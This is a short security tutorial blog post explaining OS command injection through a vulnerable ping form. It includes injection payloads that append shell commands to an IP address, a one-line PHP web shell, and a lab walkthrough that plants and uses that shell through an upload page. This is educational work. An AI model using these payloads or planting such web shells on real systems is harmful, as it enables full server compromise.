---
layout: default
title : muzec - OS Command Injection Attacks
---

![image](https://user-images.githubusercontent.com/69868171/117147074-e2f51b80-ad82-11eb-9b2e-2aa32fa81df3.png)



OS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data from a browser. 

An attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.


One example could be a search function which spawns a shell and runs a script to query through legacy records of a company. Another more obvious example could be a network monitoring application which allows you to issue Ping commands from the underlying operating system.
                                              
### How Do Command Injection Take Place??

There are many situations when the developers try to include some functionalities into their web application by making the use of the operating system commands. However, if the application passes the user-supplied input directly to the server without any validation, thus the application might become vulnerable to command injection attacks.

Let us use the second described example of an application that allows a user to send ICMP (ping) requests over the network. The input field which is used to specify the target IP address for the ping command is not properly validated on the server-side. An attacker could leverage this by appending an OS Command to the IP address and storing the result in a publicly accessible file;

```8.8.8.8 & whoami > /var/www/html/public/whoami.txt```

In the screenshot below, we can see a very simple OS command injection attack where the output of the query is directly shown back to the user. In this case there is no need to save the output of the command in a file because we can directly see it on screen.

![image](https://user-images.githubusercontent.com/69868171/117151581-38cbc280-ad87-11eb-90d3-d1385a8dac36.png)

The previous command already showed that it is possible to create an accessible file, so why not create a simple interface that enables remote access and control to the web server (also know as a web shell)?

```8.8.8.8 & echo "<?php echo shell_exec($_GET['cmd']); ?>" > /var/www/html/public/shell.php```

Let jump to some example below;

![image](https://user-images.githubusercontent.com/69868171/117152293-e2ab4f00-ad87-11eb-96e4-ed542e397236.png)
We have some upload page now let try to upload a webshell ```<?php echo shell_exec($_GET['cmd']); ?>``` save in a file in php and upload it.

![image](https://user-images.githubusercontent.com/69868171/117152625-3322ac80-ad88-11eb-92dd-7aed49967895.png)

Since what we upload is store in the upload directory let try to access it.

![image](https://user-images.githubusercontent.com/69868171/117152820-606f5a80-ad88-11eb-83a0-2ea75d9bdeab.png)

![image](https://user-images.githubusercontent.com/69868171/117152859-6c5b1c80-ad88-11eb-8354-0bb076f17bc6.png)

Now what we have to do is to access the file and edit the url to ```http://10.150.150.11/upload/2/shell.php?cmd=``` adding a cmd parameter since we add it in the web shell.

![image](https://user-images.githubusercontent.com/69868171/117153226-c52ab500-ad88-11eb-8a45-01199d618f3d.png)

As of now, we are confirmed that the application which we are trying to surf is suffering from command injection vulnerability we can now try to get a shell back or move on.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

